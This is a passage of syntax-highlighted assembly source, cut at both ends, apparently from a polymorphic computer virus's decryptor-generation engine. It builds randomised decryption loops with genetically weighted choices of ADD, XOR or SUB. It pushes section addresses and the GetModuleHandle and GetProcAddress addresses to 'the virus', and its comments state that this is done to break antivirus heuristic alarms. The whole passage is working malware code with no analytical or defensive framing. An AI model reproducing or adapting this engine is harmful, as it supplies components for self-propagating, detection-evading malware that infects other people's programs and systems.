                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">               </span><span class="sc1">; offset for later completion</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_CODE_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoADDRegValue</span><span class="sc0">    </span><span class="sc1">; Add the offset of CODE_SECTION</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">              </span><span class="sc1">; Save it at +10h in decryptor's</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0">      </span><span class="sc1">; data frame</span><span class="sc0">

       </span><span class="sc1">; Now we push parameters for the virus. We pass all the new section</span><span class="sc0">
       </span><span class="sc1">; addresses, the flag of GetModuleHandle usage (ASCII or UNICODE) and</span><span class="sc0">
       </span><span class="sc1">; the Delta Register the virus is using. We also push the addresses of</span><span class="sc0">
       </span><span class="sc1">; the functions GetModuleHandle and GetProcAddress, so the virus hasn't</span><span class="sc0">
       </span><span class="sc1">; to scan the KERNEL32 to get the values of the functions, breaking</span><span class="sc0">
       </span><span class="sc1">; another heuristic alarm. The values of the passed functions have the</span><span class="sc0">
       </span><span class="sc1">; upper bits of the sections with a random value, since in the</span><span class="sc0">
       </span><span class="sc1">; entrypoint our code will anulate that bits (this is only to make the</span><span class="sc0">
       </span><span class="sc1">; passing of values more random).</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FC000000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DISASM2_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">   </span><span class="sc1">; Push DISASM2_SECTION address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FC000000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">   </span><span class="sc1">; Push the DATA_SECTION address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FC000000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_BUFFERS_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">   </span><span class="sc1">; Push the BUFFERS_SECTION address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FC000000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DISASM_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">   </span><span class="sc1">; Push the DISASM2_SECTION address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FC000000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_CODE_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">   </span><span class="sc1">; Push the CODE_SECTION address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetProcAddressAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">  </span><span class="sc1">; Push the address of GetProcAddress</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">  </span><span class="sc1">; Push the address of GetModuleHandle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetModuleHandleMode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0">  </span><span class="sc1">; Push the delta register *2 and</span><span class="sc0">
                                          </span><span class="sc1">; the A/W flag in the bit 0.</span><span class="sc0">


                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Get the first PRIDE value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_InitialValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Get the second PRIDE value</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_Addition</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Get the initial random index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                 </span><span class="sc1">; Set this register to a random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; value</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SelectThreeRegisters</span><span class="sc0"> </span><span class="sc1">; Select three registers to</span><span class="sc0">
                                           </span><span class="sc1">; use as Index, Counter and Buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_SetValueToRegisters</span><span class="sc0">
                                           </span><span class="sc1">; Set the values obtained before</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_InsertLabel</span><span class="sc0">        </span><span class="sc1">; Set the label for looping</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_LoopLabel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">          </span><span class="sc1">; Save the register</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoXORRegReg</span><span class="sc0">        </span><span class="sc1">; XOR Index with Counter (get</span><span class="sc0">
                                          </span><span class="sc1">; a pseudo-random index for decrypt)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">         </span><span class="sc1">; Check if we overpass the data size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfNewCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFCh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc0">            </span><span class="sc1">; If we overpass it, go to get the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; next pseudorandom index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_ExcessJumpInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">            </span><span class="sc1">; Save this address for later</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Get the DWORD at that index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0800h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartOfEncryptedData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; WEIGHT_X007</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X004_7</span><span class="sc0">  </span><span class="sc1">; Select if we encrypt or not</span><span class="sc0">
                                              </span><span class="sc1">; genetically.</span><span class="sc0">
                                            </span><span class="sc1">; If we don't encrypt, we only</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; copy directly the DWORD to</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoEncryption</span><span class="sc0">        </span><span class="sc1">; Memory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">              </span><span class="sc1">; Get a random Key</span><span class="sc0">
    </span><span class="sc5">@@NoEncryption</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptionKey</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Set the decryption key in ECX</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; 0? (i.e. don't encrypt data)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DontMakeDecryption</span><span class="sc0">
     </span><span class="sc1">;@@OtherMethod:</span><span class="sc0">
                </span><span class="sc1">; WEIGHT_X008,WEIGHT_X009</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0">  </span><span class="sc1">; Select an encryption method:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; ADD, XOR or SUB. We select</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MethodXOR_prev</span><span class="sc0">         </span><span class="sc1">; them with the genetic weights.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetMethod</span><span class="sc0">
        </span><span class="sc5">@@MethodXOR_prev</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc5">@@SetMethod</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TypeOfEncryption</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptionKey</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the encryption key</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MethodADD</span><span class="sc0">            </span><span class="sc1">; ADD?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MethodSUB</span><span class="sc0">            </span><span class="sc1">; SUB?</span><span class="sc0">
        </span><span class="sc5">@@MethodXOR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">             </span><span class="sc1">; Construct XOR</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeDecryption</span><span class="sc0">
        </span><span class="sc5">@@MethodADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; Negate the key for ADD</span><span class="sc0">
        </span><span class="sc5">@@MethodSUB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Construct ADD with the key</span><span class="sc0">
        </span><span class="sc5">@@MakeDecryption</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; negated if we make ADD or not</span><span class="sc0">
                                             </span><span class="sc1">; if we make SUB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Complete the decryption instrc.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc5">@@DontMakeDecryption</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">            </span><span class="sc1">; Add the address of the allocated</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; memory (with CODE_SECTION added</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">          </span><span class="sc1">; too).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Complete the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">             </span><span class="sc1">; Make a MOV of the value to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; place on the allocated memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; where it has to be</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0800h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
